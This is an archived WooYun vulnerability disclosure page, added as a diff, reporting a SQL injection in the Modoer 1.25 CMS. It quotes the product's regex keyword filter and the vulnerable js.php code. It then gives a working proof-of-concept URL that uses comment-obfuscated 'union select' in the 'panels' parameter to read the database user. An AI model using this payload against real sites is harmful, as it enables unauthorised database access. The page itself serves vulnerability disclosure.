@@ -1,0 +1,215 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		Modoer1.25 SQL 注入  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		Modoer1.25 SQL 注入  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/Zvall">Zvall</a> 
+</li><li>提交时间：		2012-07-11 10:18</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-07-11：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2012-08-25：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">SQL 注入</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail"></p><pre><code>$pattern_arr = $replace_arr = array();<br />
+if(!defined(&#039;IN_ADMIN&#039;)) {<br />
+    $pattern_arr = array(<br />
+        &quot;/ union /i&quot;, &quot;/\/\*\s?\*\/union\/\*\s?\*\//i&quot;,<br />
+        &quot;/ select /i&quot;, &quot;/\/\*\s?\*\/select\/\*\s?\*\//i&quot;,<br />
+        &quot;/ update /i&quot;, &quot;/\/\*\s?\*\/update\/\*\s?\*\//i&quot;,<br />
+        &quot;/ from /i&quot;,&quot;/\/\*\s?\*\/from\/\*\s?\*\//i&quot;,<br />
+        &quot;/ or /i&quot;,&quot;/\/\*\s?\*\/or\/\*\s?\*\//i&quot;,<br />
+        &quot;/ and /i&quot;,&quot;/\/\*\s?\*\/and\/\*\s?\*\//i&quot;,<br />
+        &quot;/ outfile /i&quot;, <br />
+        &quot;/\(\s?select\s+/i&quot;,<br />
+    );<br />
+    $replace_arr = array(<br />
+        &#039;&amp;nbsp;union&amp;nbsp;&#039;, &#039;/&amp;lowast;&amp;lowast;/union/&amp;lowast;&amp;lowast;/&#039;,<br />
+        &#039;&amp;nbsp;select&amp;nbsp;&#039;, &#039;/&amp;lowast;&amp;lowast;/select/&amp;lowast;&amp;lowast;/&#039;,<br />
+        &#039;&amp;nbsp;update&amp;nbsp;&#039;, &#039;/&amp;lowast;&amp;lowast;/update/&amp;lowast;&amp;lowast;/&#039;,<br />
+        &#039;&amp;nbsp;from&amp;nbsp;&#039;, &#039;/&amp;lowast;&amp;lowast;/from/&amp;lowast;&amp;lowast;/&#039;,<br />
+        &#039;&amp;nbsp;outfile&amp;nbsp;&#039;, <br />
+        &#039;&amp;nbsp;or&amp;nbsp;&#039;, &#039;/&amp;lowast;&amp;lowast;/or/&amp;lowast;&amp;lowast;/&#039;,<br />
+        &#039;&amp;nbsp;and&amp;nbsp;&#039;, &#039;/&amp;lowast;&amp;lowast;/and/&amp;lowast;&amp;lowast;/&#039;,<br />
+        &#039;*&amp;nbsp;from&amp;nbsp;&#039;,<br />
+        &#039;(select&amp;nbsp;&#039;,<br />
+    );<br />
+    $_POST = strip_sql($_POST);<br />
+    $_GET = strip_sql($_GET);<br />
+    $_COOKIE = strip_sql($_COOKIE);<br />
+    unset($pattern_arr, $replace_arr);<br />
+}<br />
+<br />
+define(&#039;MAGIC_QUOTES_GPC&#039;, get_magic_quotes_gpc());<br />
+if(!MAGIC_QUOTES_GPC) {<br />
+    $_POST = add_slashes($_POST);  //调用addslashes 转义<br />
+    $_GET = add_slashes($_GET);<br />
+    $_COOKIE = add_slashes($_COOKIE);<br />
+    $_FILES &amp;&amp; $_FILES = add_slashes($_FILES);<br />
+}<br />
+<br />
+if(!empty($_POST)) extract($_POST, EXTR_SKIP);  if(!empty($_GET)) extract($_GET, EXTR_SKIP);<br />
+<br />
+<br />
+<br />
+$sort = $jssort==&#039;shop&#039; ? (isset($sort) &amp;&amp; $sort &gt; 0 &amp;&amp; $sort &lt;= 3 ? $sort : 0) : (isset($sort) &amp;&amp; $sort &gt; 0 &amp;&amp; $sort &lt;= 3 ? $sort : 0);<br />
+    $num = isset($num) &amp;&amp; intval(trim($num)) &gt;= 1 ? intval(trim($num)) : 10;<br />
+    $intercept = isset($intercept) &amp;&amp; $intercept &gt; 0 ? intval($intercept) : 0;<br />
+    $openwindow = isset($openwindow) &amp;&amp; $openwindow &gt; 0 ? 1 : 0;<br />
+    $pcdname = isset($pcdname) &amp;&amp; $pcdname &gt; 0 ? 1 : 0;<br />
+<br />
+    if(!$sort) {<br />
+        exit(&quot;document.write(\&quot;未选择显示类型。\&quot;);&quot;);<br />
+    }<br />
+    $cachename = &#039;js_&#039;.md5($jssort.$panels.$sort.$num);<br />
+    $cachefile = MUDDER_CACHEDIR.&#039;cache_&#039;.$cachename.&#039;.php&#039;;<br />
+<br />
+    $where = &#039;&#039;;<br />
+<br />
+    if((@!include($cachefile)) || $timestamp - $_createtime_js &gt; $cachelife) {<br />
+<br />
+        $panels = $panels ? explode(&#039;_&#039;, $panels) : &#039;&#039;;<br />
+        if($panels &amp;&amp; is_array($panels)) foreach($panels as $panel) {<br />
+            $where .= ($where ? &quot; OR &quot; : &quot; &quot;).&quot;classcode like &#039;{$panel}__&#039;&quot;;<br />
+        }</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+注入有木有？ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">http://localhost/sa/js.php?jssort=shop&amp;sort=1&amp;num=2&amp;panels=_sb_fack_a&#039;+and/**/1=2/**/union select+1,user(),3,4,5%23<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/1110170710e7422820ab3cc27a2dea85098c4a8a.png" target="_blank"><img src="../images/1110170710e7422820ab3cc27a2dea85098c4a8a.png" alt="" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">过滤 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/Zvall" title="Zvall">Zvall</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-09467" title="Modoer1.25 SQL 注入">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																	
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="9467";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
